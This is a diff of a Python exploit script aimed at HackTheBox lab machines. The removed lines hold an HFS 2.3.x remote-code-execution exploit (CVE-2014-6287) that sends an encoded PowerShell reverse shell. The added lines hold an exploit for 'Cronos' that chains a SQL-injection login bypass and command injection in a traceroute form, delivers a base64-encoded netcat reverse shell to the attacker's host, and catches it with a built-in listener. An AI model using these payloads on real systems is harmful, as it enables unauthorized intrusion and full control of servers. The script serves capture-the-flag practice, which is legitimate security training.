@@ -1,21 +1,17 @@
 #! /usr/bin/env python3
 
-#### Title: Exploit HFS (HTTP File Server) 2.3.x - RCE
-#### Description: GetShell - Optimum - HTB
-#### CVE : CVE-2014-6287
+#### Title: Exploit Get Shell - RCE
 #### Author: 0xEtern4lW0lf
-#### Created: 20 Dez 2022
-#### Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
+#### Created: 22 Dez 2022
+#### Description: GetShell - Cronos - HTB
 
 #### ========= MODULES =========
 
-import base64
-import os
-import urllib.request
-import urllib.parse
 import argparse
-import sys
-
+import requests
+import socket, telnetlib
+from threading import Thread
+import base64
 
 #### ========= VARIABLE =========
 
@@ -24,7 +20,10 @@ RED = "\033[1;91m"
 YELLOW = "\033[1;93m"
 BLUE = "\033[1;94m"
 GREEN = "\033[1;92m"
-END = "\033[1;m"
+END = "\033[1;m "
+
+## Set proxy [OPTIONAL]
+#proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
 #### ========= FUNCTION =========
@@ -70,76 +69,98 @@ def banner():
   """
   return print(f'{BLUE}{EwLogo}{END}')
 
-## Arguments
-def parser():
-    parser = argparse.ArgumentParser(description='GetShell - Optinum / HTB - 0xEtern4lW0lf', add_help=False)
-    parser.add_argument('-h', '--help', help=helpme())
-    parser.add_argument('--rhost', help="Target IP address or hostname.", type=str, required=True)
-    parser.add_argument('--rport', help="Port of the target machine.", type=int, required=True)
-    parser.add_argument('--lhost', help="Local IP address or hostname.", type=str, required=True)
-    parser.add_argument('--lport', help="Local Port to receive the shell.", type=int, required=True)
+
+
+## Set the handler
+def handler(lport,target):
+    print(f"[+] Starting handler on {lport} [+]")
+    tn = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0",lport))
+    s.listen(1)
+    conn, addr = s.accept()
+    print(f"[+] Receiving connection the {target} [+]")
+    tn.sock = conn
+    print("[+] Habemus Shell! [+]")
+    tn.interact()
+
+
+## Function encode Base64
+def b64e(s):
+    return base64.b64encode(s.encode()).decode()
+
+
+## Create the payload
+def createPayload(lhost,lport):
+    print("[+] Creating the payload !! [+]")
+    global payload_encoded
+    global payload
+    payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
+    payload_encoded = str(b64e(payload))
+
+## Login as admin on the app
+def loginAdmin(rhost):
+    print("[+] Let's login as admin [+]")
+    url = f"http://{rhost}:80/"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"username": "' or 1=1-- -", "password": ""}
+    
+    ## If set proxy, add option "proxies=proxies"
+    requests.post(url, headers=headers, data=data)
+    print("[+] Logged In !! [+]")
+
+## Get the reverse shell
+def getShell(payload_encoded):
+    print("[+] Let's get the reverse shell [+]")
+    url = "http://admin.cronos.htb:80/welcome.php"
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"command": "traceroute", "host": f";echo {payload_encoded} | base64 -d | bash"}
+    
+    ## If set proxy, add option "proxies=proxies"
+    requests.post(url, headers=headers, data=data)
+
+
+## main
+def main():
+    ## Parse Arguments
+    parser = argparse.ArgumentParser(description='GetShell - Cronos / HTB - 0xEtern4lW0lf')
+    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
+    parser.add_argument('-l', '--lhost', help='Local IP address or hostname', required=True)
+    parser.add_argument('-p', '--lport', help='Local Port to receive the shell', required=True)
 
     args = parser.parse_args()
 
-    global rhost 
-    global rport 
-    global lhost 
-    global lport 
-
-    rhost = args.rhost
-    rport = args.rport
+    rhost = args.target
     lhost = args.lhost
     lport = args.lport
 
-
-def helpme():
-  print(f'[!] {YELLOW}Usage: {END}')
-  print(f'[-] python3 {sys.argv[0]} --rhost {GREEN}TARGET_IP{END} --rport {GREEN}TARGET_PORT{END} --lhost {GREEN}YOUR_IP{END} --lport {GREEN}YOUR_PORT{END}')
-  print(f'[-] {YELLOW}Note*{END} If you are using a hostname instead of an IP address please remove http:// or https:// and try again.')
-
-
-def weaponization(lhost,lport):
-    # Define the command to be written to a file
-    reverse_shell = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'
-
-    # Encode the command in base64 format
-    reverse_shell_encode = base64.b64encode(reverse_shell.encode("utf-16le")).decode()
-    print("\n[+] Encoding the payload...")
-
-    # Define the payload to be included in the URL
-    global payload
-    payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {reverse_shell_encode}'
-
-def atkTarget(rhost,rport,lhost,lport):
     
-    # Encode the payload and send a HTTP GET request
-    payload_encode = urllib.parse.quote_plus(payload)
+    ## Set up the handler
+    thr = Thread(target=handler,args=(int(lport),rhost))
+    thr.start()
     
-    url = f'http://{rhost}:{rport}/?search=%00{{.{payload_encode}.}}'
-    urllib.request.urlopen(url)
-    print("\n[+] Sending encoded payload via GET request to target")
 
-    # Print some information
+    ## Create the payload
+    createPayload(lhost,lport)
+
+
+    ## Print some information
     print("\n[+] Setting information")
+    print("[+] target: ", rhost)
     print("[+] lhost: ", lhost)
     print("[+] lport: ", lport)
-    print("[+] rhost: ", rhost)
-    print("[+] rport: ", rport)
     print("[+] payload: ", payload)
+    
 
-    # Listen for connections
-    print(f"\n[+] Listening for connection in port {lport}")
-    os.system(f'nc -nlvp {lport}')
+    ## Login as admin
+    loginAdmin(rhost)
+    
 
-def main():
-  banner()
-  weaponization(lhost,lport)
-  atkTarget(rhost,rport,lhost,lport)
-
-
+    ## Get the Shell
+    getShell(payload_encoded)
 
 #### ======= EXECUTION =======
 
-if __name__ == "__main__":
-    parser()
+if __name__ == '__main__':
+    banner()
     main()
